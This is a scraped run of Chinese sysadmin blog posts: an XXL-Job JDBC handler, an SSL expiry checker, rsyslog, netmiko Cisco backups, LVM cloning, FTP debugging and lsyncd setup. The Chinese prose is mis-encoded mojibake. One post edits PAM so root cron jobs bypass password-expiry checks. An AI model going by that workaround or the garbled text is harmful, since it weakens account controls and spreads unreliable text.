5import org.springframework.jdbc.core.JdbcTemplate; 6import org.springframework.jdbc.datasource.DriverManagerDataSource; 7 8public class DemoGlueJobHandler extends IJobHandler { 9 10\t@Override 11\tpublic void execute() throws Exception { 12 13 DriverManagerDataSource ds = new DriverManagerDataSource(); 14 ds.setDriverClassName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;); 15 ds.setUrl(\u0026#34;jdbc:mysql://localhost:3306/users?characterEncoding=UTF-8\u0026amp;useSSL=false\u0026#34;); 16 ds.setUsername(\u0026#34;root\u0026#34;); 17 ds.setPassword(\u0026#34;xxxxxxxx\u0026#34;); 18 19 JdbcTemplate jdbcTemplate = new JdbcTemplate(); 20 jdbcTemplate.setDataSource(ds); 21 22 23 List rows = jdbcTemplate.queryForList(\u0026#34;select * from user\u0026#34;); 24 Iterator it = rows.iterator(); 25 while(it.hasNext()) { 26 Map userMap = (Map) it.next(); 27 XxlJobHelper.log(userMap.get(\u0026#34;id\u0026#34;) + \u0026#34;\\t\u0026#34;); 28 XxlJobHelper.log(userMap.get(\u0026#34;name\u0026#34;) + \u0026#34;\\t\u0026#34;); 29 } 30 31 XxlJobHelper.log(\u0026#34;XXL-JOB guning, Hello World.\u0026#34;); 32\t} 33 34 35} ä¸ºäº†å®ç°mysqlå®¢æˆ·ç«¯å¯ä»¥å¯¹MySQLè¿›è¡Œè¯»å†™ï¼Œæˆ‘ä»¬éœ€è¦åœ¨xxl-jobçš„xxl-job-executor-sample-springbootç¤ºä¾‹é¡¹ç›®ä¸­ï¼Œpom.xmlä¸­å¢åŠ spring-jdbcå’Œmysql-connector-javaçš„jaråŒ…éƒ¨åˆ†ã€‚æ‰“å‡ºä¸€ä¸ªxxl-jobçš„executorçš„æ‰§è¡Œç«¯ç¨‹åºã€‚\nä»£ç åœ¨ /root/xxl-job-2.3.0/xxl-job-executor-samples/xxl-job-executor-sample-springbootç›®å½•ä¸‹ï¼Œç”¨mvn packageå°±å¯ä»¥æ‰“å‡ºxxl-job-executor-sample-springboot-2.3.0.jaråŒ…ã€‚\n1 \u0026lt;dependency\u0026gt; 2 \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; 3 \u0026lt;artifactId\u0026gt;spring-jdbc\u0026lt;/artifactId\u0026gt; 4 \u0026lt;version\u0026gt;4.3.2.RELEASE\u0026lt;/version\u0026gt; 5 \u0026lt;/dependency\u0026gt; 6 \u0026lt;dependency\u0026gt; 7 \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; 8 \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; 9 \u0026lt;version\u0026gt;${mysql-connector-java.version}\u0026lt;/version\u0026gt; 10 \u0026lt;/dependency\u0026gt; å¯åŠ¨agentçš„systemdæœåŠ¡è„šæœ¬ï¼Œ/etc/systemd/system/xxljob-agent.service\n1[Unit] 2After=network.target 3Wants=network.target 4 5[Service] 6WorkingDirectory=/usr/local/bin 7Type=simple 8ExecStart=/usr/bin/java -jar /usr/local/bin/xxl-job-executor-sample-springboot-2.3.0.jar 9Restart=on-failure 10 11[Install] 12WantedBy=multi-user.target è¿™æ ·å°±OKäº†ã€‚\n","date":"2023-12-12","img":"","permalink":"https://rendoumi.com/posts/20231212-xxl-job/","series":null,"tags":null,"title":"Xxl-Jobçš„åŠ¨æ€ç¼–è¾‘å¹¶æ‰§è¡Œjavaè„šæœ¬"},{"categories":null,"content":"è¯ä¹¦ä¼šç»å¸¸é¢ä¸´è¿‡æœŸè€Œæ²¡æœ‰åŠæ—¶ç»­è´¹çš„æƒ…å†µï¼Œå†™ä¸ªè„šæœ¬æé†’ä¸€ä¸‹è‡ªå·±å§ï¼š\ncrontab -l\n0 8 * * * /usr/local/bin/check_ssl.sh www.ddky.com\rcheck_ssl.shçš„å†…å®¹ï¼š\n1#!/bin/bash 2# Print the number of days till certificate expiration 3# 4# Example: 5# $ check_cert.sh sleeplessbeastie.eu 6# 81 7# $ check_cert.sh lwn.net 8# 630 9# 10# Exit codes: 11# 0 - certificate is not expired 12# 1 - certificate is expired 13# 254 - certificate is empty 14# 255 - DNS resolution failed 15# 16 17# temporary file to store certificate 18certificate_file=$(mktemp) 19 20# delete temporary file on exit 21trap \u0026#34;unlink $certificate_file\u0026#34; EXIT 22 23if [ \u0026#34;$#\u0026#34; -eq \u0026#34;1\u0026#34; ]; then 24 website=\u0026#34;$1\u0026#34; 25 host \u0026#34;$website\u0026#34; \u0026gt;\u0026amp;- 26 if [ \u0026#34;$?\u0026#34; -eq \u0026#34;0\u0026#34; ]; then 27 echo -n | openssl s_client -servername \u0026#34;$website\u0026#34; -connect \u0026#34;$website\u0026#34;:443 2\u0026gt;/dev/null | sed -ne \u0026#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p\u0026#39; \u0026gt; $certificate_file 28 certificate_size=$(stat -c \u0026#34;%s\u0026#34; $certificate_file) 29 if [ \u0026#34;$certificate_size\u0026#34; -gt \u0026#34;1\u0026#34; ]; then 30 date=$(openssl x509 -in $certificate_file -enddate -noout | sed \u0026#34;s/.*=\\(.*\\)/\\1/\u0026#34;) 31 date_s=$(date -d \u0026#34;${date}\u0026#34; +%s) 32 now_s=$(date -d now +%s) 33 date_diff=$(( (date_s - now_s) / 86400 )) 34 echo \u0026#34;$date_diff\u0026#34; 35 if [ \u0026#34;$date_diff\u0026#34; -le 37 ]; then 36 /usr/local/bin/mailsend -q -to \u0026#34;zhangranrui@ddky.com\u0026#34; -from monit@ddky.com -ssl -port 465 -auth -auth-plan -smtp smtp.exmail.qq.com -sub \u0026#34;è¯ä¹¦å°±è¦åˆ°æœŸäº†\u0026#34; -v -user \u0026#34;monit@ddky.com\u0026#34; -pass \u0026#34;xxxxxxxx\u0026#34; -cs \u0026#34;utf-8\u0026#34; -enc-type \u0026#34;base64\u0026#34; -M \u0026#34;$website è¿˜æœ‰ $date_diff å¤©å°±è¦åˆ°æœŸäº†ï¼ï¼ï¼\u0026#34; 37 fi 38 if [ \u0026#34;$date_s\u0026#34; -gt \u0026#34;$now_s\u0026#34; ]; then 39 exit 0 # ok 40 else 41 exit 1 # not ok 42 fi 43 else 44 exit 254 45 fi 46 else 47 exit 255 48 fi 49fi ","date":"2023-12-12","img":"","permalink":"https://rendoumi.com/posts/20231212-check_ssl/","series":null,"tags":null,"title":"æ£€æŸ¥è¯ä¹¦æ˜¯å¦è¿‡æœŸçš„è„šæœ¬"},{"categories":null,"content":"æ•°æ®åº“ç®¡ç†å‘˜çš„ 172.18.20.10 å’Œ 172.18.20.25 æ•°æ®åº“å¤‡ä»½è„šæœ¬æ˜¯ä»¥ root èº«ä»½è¿è¡Œçš„ï¼Œåœ¨ crontab é‡Œè·‘ï¼š\n126 11 * * * /root/scripts/mysql_backup_full_3306.sh \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 ä½†æ˜¯ç”±äº root å¯†ç ä¼šæ¯ä¸‰ä¸ªæœˆå˜æ›´ä¸€æ¬¡ï¼Œå¦‚æœæ²¡æœ‰åŠæ—¶å˜æ›´ï¼Œä¼šå¯¼è‡´ root å¯†ç å¤±æ•ˆï¼Œä»è€Œ crontab æ— æ³•æ­£å¸¸è¿è¡Œã€‚\nè§£å†³æ–¹æ³•å¾ˆç®€å•ï¼š æ‰¾åˆ° /etc/pam.d/password-auth , å…¶ä¸­ account çš„æœ‰å››è¡Œ\n1account required pam_unix.so 2account sufficient pam_localuser.so 3account sufficient pam_succeed_if.so uid \u0026lt; 1000 quiet 4account required pam_permit.so åœ¨å‰é¢å¢åŠ ä¸¤è¡Œï¼š\n1account required pam_access.so 2account [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uid 3 4account required pam_unix.so 5account sufficient pam_localuser.so 6account sufficient pam_succeed_if.so uid \u0026lt; 1000 quiet 7account required pam_permit.so è¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸ç”¨é‡å¯ä»»ä½•æœåŠ¡ã€‚\npam éªŒè¯çš„æ—¶å€™ï¼Œå³ä½¿å¯†ç è¿‡æœŸï¼Œcrond ä¾ç„¶æ­£å¸¸è·‘ï¼Œå°± ok äº†ã€‚\n","date":"2023-12-11","img":"","permalink":"https://rendoumi.com/posts/20231211-crontab_root/","series":null,"tags":null,"title":"Rootçš„crontabç”±äºrootå¯†ç å¤±æ•ˆå¯¼è‡´ä¸èƒ½æ­£å¸¸å·¥ä½œ"},{"categories":null,"content":"Rsyslogçš„æ¨¡æ¿æ–‡ä»¶æŒ‰æ—¥æœŸå­˜æ”¾ï¼š\n1$template 10.161.54.11,\u0026#34;/var/log/rsyslog/%fromhost-ip%/netflow_%$YEAR%-%$MONTH%-%$DAY%.log\u0026#34; 2$template 10.161.50.5,\u0026#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%$YEAR%-%$MONTH%-%$DAY%.log\u0026#34; 3$template 10.161.50.7,\u0026#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%$YEAR%-%$MONTH%-%$DAY%.log\u0026#34; 4 5#ä»ç‰¹å®šipæ¥çš„æ—¥å¿—å‘åˆ°ç‰¹å®šrsyslogæœåŠ¡å™¨ä¸Šå» 6#:fromhost-ip, !isequal, \u0026#34;127.0.0.1\u0026#34; ?Remote 7:fromhost-ip, isequal, \u0026#34;10.161.54.11\u0026#34; ?10.161.54.11 8:fromhost-ip, isequal, \u0026#34;10.161.50.5\u0026#34; ?10.161.50.5 9:fromhost-ip, isequal, \u0026#34;10.161.50.7\u0026#34; ?10.161.50.7 Rsyslogæ‰“å‡ºæ‰€æœ‰è°ƒè¯•ä¿¡æ¯ï¼š\n*.* /var/log/debugfmt;RSYSLOG_DebugFormat\nè°ƒè¯•ä¿¡æ¯:\n1FROMHOST: \u0026#39;172.18.18.9\u0026#39;, fromhost-ip: \u0026#39;172.18.18.9\u0026#39;, HOSTNAME: \u0026#39;172.18.18.9\u0026#39;, PRI: 5, 2syslogtag \u0026#39;time:\u0026#39;, programname: \u0026#39;time\u0026#39;, APP-NAME: \u0026#39;time\u0026#39;, PROCID: \u0026#39;-\u0026#39;, MSGID: \u0026#39;-\u0026#39;, 3TIMESTAMP: \u0026#39;Mar 4 09:04:45\u0026#39;, STRUCTURED-DATA: \u0026#39;-\u0026#39;, 4msg: \u0026#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39; 5escaped msg: \u0026#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39; 6inputname: imudp rawmsg: \u0026#39;\u0026lt;5\u0026gt;time:2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39; 7$!: 8$.: 9$/: Rsyslogçš„isequalï¼Œä¸å»ºè®®ï¼Œå»ºè®®ç”¨==\nif $fromhost isequal 172.18.18.9 then /var/log/nips.log\n1if $fromhost-ip == \u0026#39;172.18.18.9\u0026#39; then { 2 action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34;) 3} Rsyslogçš„ommysqlç”¨æ³•\n1$ModLoad ommysql 2 3*.info;mail.none;authpriv.none;cron.none :ommysql:localhost,Syslog,nips,xxxxxxxx 4 5*.info;mail.none;authpriv.none;cron.none action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34;) 6 7$template dbFormat,\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;%msg%\u0026#39;, %syslogfacility%, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;%syslogtag%\u0026#39;)\u0026#34;,sql 8action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; serverport=\u0026#34;3306\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34; template=\u0026#34;dbFormat\u0026#34;) 9 10#172.18.31.34ä¸Šçš„å®é™…ç”¨æ³•ï¼š 11if $fromhost-ip == \u0026#39;172.18.18.9\u0026#39; then { 12 if $syslogpriority == 7 then { 13 $template dbFormat1,\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;%msg%\u0026#39;, 10, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;nips\u0026#39;)\u0026#34;,sql 14 action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; serverport=\u0026#34;3306\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34; template=\u0026#34;dbFormat1\u0026#34;) 15 } 16 else { 17 $template dbFormat2,\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;time:%msg%\u0026#39;, 10, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;nips\u0026#39;)\u0026#34;,sql 18 action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; serverport=\u0026#34;3306\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34; template=\u0026#34;dbFormat2\u0026#34;) 19 } 20} 21\u0026amp; ~ Rsyslogä¸­\u0026amp; ~çš„ç”¨æ³•\n1:fromhost-ip,startswith,â€™192.168.1.â€™ /var/log/remote-devs.log 2\u0026amp; ~ (The next line (â€œ\u0026amp; ~â€) is important: it tells rsyslog to stop processing the message after it was written to the log. As such, these messages will not reach the local part. Without that â€œ\u0026amp; ~â€, messages would also be written to the local files.\nFacilityçš„çº§åˆ«ï¼š Serverityçš„çº§åˆ«Serverityçš„çº§åˆ« ","date":"2023-12-11","img":"","permalink":"https://rendoumi.com/posts/20231211-rsyslog_usage/","series":null,"tags":null,"title":"Rsyslogçš„ä¸€äº›ç‰¹æ®Šç”¨æ³•"},{"categories":null,"content":"è¿™ä¸ªå…¶å®æ˜¯ç½‘ç»œå·¥ç¨‹å¸ˆçš„å·¥ä½œï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š\nä¸€ã€ç”¨sshå¤‡ä»½Ciscoè®¾å¤‡çš„è„šæœ¬ éœ€è¦äº‹å…ˆåœ¨/root/.ssh/configé…ç½®å¥½ç›´æ¥ç™»å½•ï¼Œå¹¶ä¸”åœ¨Ciscoè®¾å¤‡é‡Œè®¾ç½®å¥½æƒé™çº§åˆ«ï¼Œå¯ä»¥æ‰§è¡Œshow run\n1#!/bin/sh 2sshcmd=\u0026#34;ssh -o LogLevel=quiet\u0026#34; 3$sshcmd $1 \u0026#34;show run\u0026#34; \u0026gt; /root/backup/$1-$(date \u0026#39;+%Y%m%d\u0026#39;).txt äºŒã€å¤‡ä»½Ciscoè®¾å¤‡çš„Pythonè„šæœ¬ï¼Œè¿™ä¸ªå¯æ§æ€§æ›´é«˜ï¼š é¦–é€‰éœ€è¦åœ¨/export/servers/python363è£…å¥½python, pip install netmiko å…¶æ¬¡ï¼Œåœ¨è·¯ç”±å™¨ä¸Šå¯ä»¥é…ç½®ençš„å¯†ç \n1#!/export/servers/python363/bin/python3.6 2 3from netmiko import Netmiko 4import time 5 6tw_bgp = { 7 \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, 8 \u0026#34;host\u0026#34;: \u0026#34;tw-bgp\u0026#34;, 9 \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.10\u0026#34;, 10 \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, 11 \u0026#34;use_keys\u0026#34;: True, 12 \u0026#34;secret\u0026#34; : \u0026#34;xxxxxxxx\u0026#34;, 13 \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, 14} 15 16tw_r1_e1 = { 17 \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, 18 \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e1\u0026#34;, 19 \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.11\u0026#34;, 20 \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, 21 \u0026#34;use_keys\u0026#34;: True, 22 \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, 23} 24 25tw_r1_e2 = { 26 \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, 27 \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e2\u0026#34;, 28 \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.12\u0026#34;, 29 \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, 30 \u0026#34;use_keys\u0026#34;: True, 31 \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, 32} 33 34tw_r2_e1 = { 35 \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, 36 \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e1\u0026#34;, 37 \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.13\u0026#34;, 38 \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, 39 \u0026#34;use_keys\u0026#34;: True, 40 \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, 41} 42 43tw_r2_e2 = { 44 \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, 45 \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e2\u0026#34;, 46 \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.14\u0026#34;, 47 \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, 48 \u0026#34;use_keys\u0026#34;: True, 49 \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, 50} 51 52devices=[tw_bgp, tw_r1_e1, tw_r1_e2, tw_r2_e1, tw_r2_e2] 53 54for dev in devices: 55 name = dev[\u0026#34;ip\u0026#34;] 56 connection = Netmiko(**dev) 57 connection.enable() 58 out = connection.send_command(\u0026#34;show running-config\u0026#34;) 59 calender = time.strftime(\u0026#34;%Y%m%d\u0026#34;) 60 file_name = \u0026#39;{}-{}.txt\u0026#39;.format(dev[\u0026#34;host\u0026#34;],calender) 61 file = open(file_name ,\u0026#34;w\u0026#34;) 62 file.write(out) 63 file.close() 64 connection.disconnect() 65 print(\u0026#34;BACKUP for %s done\u0026#34; %dev[\u0026#34;host\u0026#34;]) ","date":"2023-12-11","img":"","permalink":"https://rendoumi.com/posts/20231211-netdev_backup/","series":null,"tags":null,"title":"ç½‘ç»œè®¾å¤‡é…ç½®çš„å¤‡ä»½"},{"categories":null,"content":"ç”¨pxeè¿œç¨‹å¯åŠ¨ä¸€ä¸ªiscsiå·çš„æ–¹æ³•å·²ç»ä¼šäº†çš„è¯ã€‚\nå¦‚æœæˆ‘ä»¬è¦æ‰¹é‡äº§æ–°è™šæœºï¼Œæœ€å¿«çš„æ–¹æ³•åº”è¯¥æ˜¯æŠŠè¿œç¨‹çš„iscsiå·cloneä¸€ä¸‹ï¼Œä¾›æ–°çš„è™šæœºç”¨ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\nåœ¨172.18.30.18ä¸Šæ“ä½œ\næŸ¥çœ‹ä¸€ä¸‹ï¼ŒåŸæ¥æœ‰ä¸¤ä¸ªLVï¼ˆé€»è¾‘å·ï¼‰\n# lvdisplay\ré‚£å°±æŠŠpvc-vis-18-31-48çš„lvmè™šæœºå·ï¼Œå…ˆcopyåšä¸ªmirrorï¼Œ-bå‚æ•°è¡¨ç¤ºåå°è¿è¡Œã€‚\n# lvconvert --type mirror --alloc anywhere -m1 /dev/vg-targetd/pvc-vis-18-31-48 -b\rLogical volume vg-targetd/pvc-vis-18-31-48 converted.\ræç¤ºä¸€ä¸‹å°±è¿è¡Œå®Œæ¯•äº†ï¼Œè™šå‡å•Šï¼Œåå°æ­£åœ¨è¿è¡ŒåŒæ­¥ä¿¡æ¯ï¼š\nlvs -a -o +devices | egrep \u0026quot;LV|48\u0026quot;\rçœ‹é‚£ä¸ªCpy\u0026amp;Syncï¼Œé‚£ä¸ªæ˜¯è¿›åº¦æ¡ï¼Œæ‰6.91ï¼ŒåŠ¡å¿…ç­‰èµ°åˆ°100ï¼Œå†è¿›è¡Œåç»­æ“ä½œ\nç„¶åç ´å¼€è¿™ä¸ªmirrorï¼ŒæŠŠå‰¯æœ¬å‘½åä¸ºvis-18-31-49\n#lvconvert --splitmirrors 1 --name vis-18-31-49 /dev/vg-targetd/pvc-vis-18-31-48\rLogical volume vg-targetd/pvc-vis-18-31-48 converted.\rå†è¿è¡Œ lvdisplay\nå¤šå‡ºä¸€ä¸ªé€»è¾‘å·pvc-vis-18-31-49ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥ç”¨è¿™ä¸ªæ–°å·å»ºç«‹iscsiå¯¹è±¡äº†ã€‚\nè¿™ä¸ªå·è£…çš„Linuxæ˜¯Centos 7 lastï¼Œç½‘å¡æ˜¯dhcpï¼Œå¯ä»¥å½“æ¨¡æ¿å¤ç”¨ã€‚\n","date":"2023-12-08","img":"","permalink":"https://rendoumi.com/posts/20231208-iscsi_lv_clone/","series":null,"tags":null,"title":"Lvmå·çš„cloneæ–¹æ³•"},{"categories":null,"content":"é—®é¢˜è¯´æ˜ï¼š 1ã€ç ”å‘åŒäº‹åé¦ˆåº”ç”¨ç¨‹åºä¸Šä¼ ä¸€å¼ å›¾ç‰‡è€—æ—¶6åˆ†é’Ÿï¼Œè®©æˆ‘ä»¬æ’æŸ¥ä¸€ä¸‹æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Ÿ\n1[INFO] 2022-03-01 17:16:38.295 [vu73wwv64ba4ncfzaiiou2qsem] [DubboServerHandler-172.18.32.254:20881-thread-2400] [FtpFile.java:854:uploadFileToPath()] uploadFileToPath path://c/product/590389/display/,fileName:display.jpg, cost:383667 ms æ˜¾ç¤ºä¸Šä¼ ä¸€å¼ å›¾ç‰‡èŠ±äº†383667msï¼Œæ²¡é“ç†å•Šï¼Œè¿™äº‹è‡ªå»ºçš„vsftpæœåŠ¡å™¨ï¼Œä¹Ÿæ²¡å¾€ossæ¡¶é‡Œæ”¾ä¸œè¥¿çš„ã€‚\né—®é¢˜æ’æŸ¥ï¼š 1ã€ç™»å½•åˆ°30.18ä¸Šé¢æŸ¥çœ‹vsftpdæ—¥å¿—ä¿¡æ¯ï¼Œè¿‡æ»¤display.jpgçš„ä¿¡æ¯ï¼Œå‘ç°ä¸Šä¼ ä¿¡æ¯æ˜¯æ­£å¸¸çš„ã€‚\n2ã€æŸ¥çœ‹prometheusç›‘æ§å„é¡¹æŒ‡æ ‡éƒ½å¾ˆæ­£å¸¸ã€‚å”¯æœ‰é‚£ä¸ªç‚¹çš„ioæ¯”å¹³æ—¶é«˜ä¸€ç‚¹ï¼Œä»€ä¹ˆåŸå› å¯¼è‡´æœªçŸ¥.\n3ã€æŸ¥çœ‹vsftpdçš„å…¨éƒ¨æ—¥å¿—ä¿¡æ¯ï¼Œå‘ç°ftpæ¯åˆ°ä¸€ä¸ªç›®å½•å°±æ‰§è¡Œä¸€ä¸ªlistæ“ä½œï¼Œç”±äºproductç›®å½•ä¸‹é¢æ–‡ä»¶å¾ˆå¤šï¼Œæ‰€ä»¥è¿‡äº†6åˆ†é’Ÿæ‰ç›¸åº”ç»“æœï¼Œè¿™å°±æ˜¯å¯¼è‡´ftpæ…¢çš„åŸå› ã€‚ [å›¾ç‰‡] 4ã€æ‰¾ç ”å‘éƒ¨é—¨éªŒè¯ï¼Œç»ˆäºå‘ç°ftpå…¬å…±ç»„ä»¶ï¼Œä»£ç é‡Œç¡®å®æœ‰è¿™ä¸ªlistæ“ä½œã€‚ æ€»ç»“ï¼šå¼€å‘ç—…å¾—ä¸æ¸…ï¼Œåˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨å±…ç„¶æ¯æ¬¡éƒ½åˆ·ä¸€ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œå¤ªå¼±æ™ºäº†ã€‚\n","date":"2023-12-08","img":"","permalink":"https://rendoumi.com/posts/20231208-ftp_slowly/","series":null,"tags":null,"title":"å¼€å‘æŠ•è¯‰FTPæ…¢é—®é¢˜çš„è§£å†³"},{"categories":null,"content":"å…¬å¸ä½¿ç”¨æ™ºé½¿çš„æœºå™¨å´©äº†ï¼Œè¦åšæ•°æ®è¿ç§»ã€‚\nç”±ä¸‰å°è€æœºå™¨è¿ç§»åˆ°ä¸‰å°æ–°kvmæœºå™¨\næˆ‘ä»¬éœ€è¦æŠŠå…¶ä¸­ä¸€å°34.38çš„çš„ä¸œè¥¿å®æ—¶åŒæ­¥ä¸¤ä»½ï¼Œä¸€ä»½åˆ°30.18çš„glusterfsï¼Œä¸€ä»½åˆ°34.41çš„/data\nåŒæ—¶ä¹Ÿè¦æ³¨æ„30.18çš„GFSä¸­å·²ç»æœ‰ä¸¤ä¸ªè™šæœºæ–‡ä»¶ï¼Œ32.6å’Œ34.38çš„qcow2\næ‰€ä»¥lsyncåŠ¡å¿…è¦å°å¿ƒï¼Œä¸èƒ½åˆ é™¤å·²æœ‰æ–‡ä»¶\nå®‰è£…å¾ˆç®€å•ï¼š\n1yum install epel-release 2yum install lsyncd 172.18.34.38ä¸Šé¢çš„/etc/lsyncd.confå¦‚ä¸‹ï¼ŒåŒæ­¥åˆ°ä¸¤ä¸ªç›®çš„åœ°ï¼š æ³¨æ„ä¸‹é¢çš„å‚æ•°ï¼š\nmaxProcesses = 2 # æœ¬æœºç”¨äºrsyncçš„è¿›ç¨‹æ•°\ndelete = \u0026lsquo;running\u0026rsquo; # åªåˆ é™¤lsyncå¯åŠ¨ä¹‹ååˆ é™¤çš„æ–‡ä»¶ï¼Œç›®çš„æ–‡ä»¶å¤¹ä¸­åŸæœ‰çš„æ–‡ä»¶ä¿å­˜\nexclude = \u0026ldquo;upload\u0026rdquo; # ç¬¬äºŒä¸ªåŒæ­¥ä¸­æ’é™¤çš„ç›®å½•ï¼Œæ³¨æ„è¿™é‡Œæ˜¯åŒ¹é…å…¨è·¯å¾„ä¸­çš„éƒ¨åˆ†å­—ä¸²ï¼Œupload å¯ä»¥åŒ¹é…åˆ° /data/new/chatmsg/upload/allajl.jpgï¼Œå°±uploadç›®å½•ä¸‹æ–‡ä»¶å¤§ï¼Œæ‰€ä»¥æŠŠå®ƒæ’é™¤ã€‚**è¿™é‡Œçš„è§„åˆ™æ˜¯å’Œrsyncä¸­excludeçš„å†™æ³•ä¸åŒçš„ï¼ï¼ï¼**åªå–è·¯å¾„ä¸­çš„uploadå­—ä¸²å°±å¯ä»¥æ’é™¤ã€‚\n1---- 2-- User configuration file for lsyncd. 3-- 4-- Simple example for default rsync, but executing moves through on the target. 5-- 6-- For more examples, see /usr/share/doc/lsyncd*/examples/ 7-- 8-- sync{default.rsyncssh, source=\u0026#34;/var/www/html\u0026#34;, host=\u0026#34;localhost\u0026#34;, targetdir=\u0026#34;/tmp/htmlcopy/\u0026#34;} 9 10settings { 11 logfile = \u0026#34;/var/log/lsyncd/lsyncd.log\u0026#34;, 12 statusFile = \u0026#34;/var/log/lsyncd/lsyncd-status.log\u0026#34;, 13 statusInterval = 5, 14 maxProcesses = 2 15} 16 17sync { 18 default.rsync, 19 source = \u0026#34;/data/new\u0026#34;, 20 target = \u0026#34;172.18.30.18::new\u0026#34;, 21 delete = \u0026#39;running\u0026#39;, 22 delay = 5, 23 rsync = { 24 binary = \u0026#34;/usr/bin/rsync\u0026#34;, 25 archive = true, 26 compress = false, 27 verbose = true 28 } 29} 30 31sync { 32 default.rsync, 33 source = \u0026#34;/data\u0026#34;, 34 target = \u0026#34;172.18.34.41::new\u0026#34;, 35 delete = \u0026#39;running\u0026#39;, 36 exclude = \u0026#34;upload\u0026#34;, 37 delay = 5, 38 rsync = { 39 binary = \u0026#34;/usr/bin/rsync\u0026#34;, 40 archive = true, 41 compress = false, 42 verbose = true 43 } 44} å¯¹ç«¯rsyncdçš„é…ç½®å¦‚ä¸‹ï¼š\n1# cat /etc/rsyncd.conf 2# /etc/rsyncd: configuration file for rsync daemon mode 3 4# See rsyncd.conf man page for more options. 5 6# configuration example: 7 8# uid = nobody 9# gid = nobody 10# use chroot = yes 11# max connections = 4 12# pid file = /var/run/rsyncd.pid 